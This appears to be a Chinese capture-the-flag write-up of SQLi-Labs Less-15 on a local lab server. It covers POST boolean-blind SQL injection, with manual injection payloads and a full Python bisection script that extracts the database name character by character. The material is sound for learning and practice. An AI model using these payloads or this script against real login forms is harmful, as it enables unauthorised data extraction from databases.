【SQLi-Labs】Less-15 POST型布尔盲注与自动化脚本 Writeup

操作者：何芊宏 | 操作日期：2026.10.24 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, POST注入, 布尔盲注, Python

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-15 (POST - Blind - Boolian/time Based - Single quotes)
  • 提示：POST请求，盲注，单引号闭合

2. 解题思路与前置原理

本关卡为 POST 登录框。无数据回显，且屏蔽了 SQL 报错信息。只能通过页面状态判断条件真假：若查询成功回显 flag.jpg，失败则回显 slap.jpg。因此采用 布尔盲注（Boolean-based Blind SQLi）。

由于手工盲注效率低下，需编写 Python 脚本，利用二分法（Bisection）快速逼近目标字符的 ASCII 码。脚本需封装 is_true() 发送 POST 请求、bisect() 执行二分查找，并通过 extract() 先查长度、再逐字提取，实现自动化脱库。

3. 操作步骤与解析

第一步：手工验证注入点

在 Burp Suite 中抓取 POST 请求并测试闭合方式：

  • 输入 uname=admin' AND 1=1 #&passwd=123&submit=Submit，页面返回成功（包含 flag.jpg）。
  • 输入 uname=admin' AND 1=2 #&passwd=123&submit=Submit，页面返回失败（包含 slap.jpg）。

解释与原理：确认存在单引号字符型注入，且可通过 flag.jpg 或 slap.jpg 进行 True/False 判定。

第二步：编写自动化盲注脚本

在 VS Code 中编写以下脚本并运行（需依赖 requests 库）：

import requests

# 靶场地址
url = "http://localhost/sqli-labs-master/Less-15/"
# Less-15 成功页返回 ../images/flag.jpg，失败页返回 ../images/slap.jpg
success_mark = "flag.jpg"

def is_true(cond):
    """把条件直接放进 WHERE，返回该条件在数据库里是否为真"""
    data = {
        "uname": f"admin' AND ({cond}) #",
        "passwd": "123456",
        "submit": "Submit",
    }
    response = requests.post(url, data=data, timeout=5)
    return success_mark in response.text

def bisect(expr, low, high):
    """二分求出 expr 的值"""
    while low <= high:
        mid = (low + high) // 2
        if is_true(f"{expr}>{mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract(sql):
    """先取长度，再逐字符二分"""
    # 先查数据长度
    n = bisect(f"length(({sql}))", 0, 64)
    result = ""
    # 根据长度循环查每个字符的 ASCII 码
    for i in range(1, n + 1):
        ascii_code = bisect(f"ascii(substr(({sql}),{i},1))", 32, 126)
        char = chr(ascii_code)
        result += char
        print(f"[+] 发现第 {i}/{n} 个字符: {char}，当前结果为: {result}")
    return result

def main():
    print("[*] 开始 POST 布尔盲注...")
    # 提取当前数据库名
    database_name = extract("select database()")
    print(f"[*] 爆破完成，数据库名为: {database_name}")

if __name__ == "__main__":
    main()

代码成分解析：

  • is_true(cond)：将条件直接拼接到 AND ({cond}) 中，发送 POST 请求，通过判断响应文本中是否包含 flag.jpg 返回布尔值。
  • bisect(expr, low, high)：经典二分查找，不断将表达式与 mid 比较，快速收敛到确切的 ASCII 码或长度。
  • extract(sql)：先查长度避免死循环，再按长度逐字提取，具有良好的通用性和容错性。
  • 核心坑点：不能用 if(cond, 1, 2)，因为在 WHERE 子句中非零值恒为真，会导致判定失效；必须直接将条件放入 WHERE 进行判断。

第三步：执行结果

运行脚本，终端成功逐字打印出 s, e, c, u, r, i, t, y，最终输出数据库名 security。

4. 踩坑记录与复盘

  • 判定标志的选择：页面渲染出来的文字不一定在底层 HTML 源码中，因此以底层返回的图片文件名 flag.jpg 作为判定标志最为稳妥。
  • 盲注脚本的容错：加入 timeout=5 防止网络问题导致脚本卡死；先查长度再爆破，避免因固定循环范围导致数据截断或空跑。

5. 知识点总结

  • POST 布尔盲注：在没有回显和报错的情况下，通过构造布尔条件，根据页面状态差异推断数据。
  • 二分法自动化：利用 Python 封装请求与查找逻辑，将原本需要数万次的手工操作压缩至数百次。
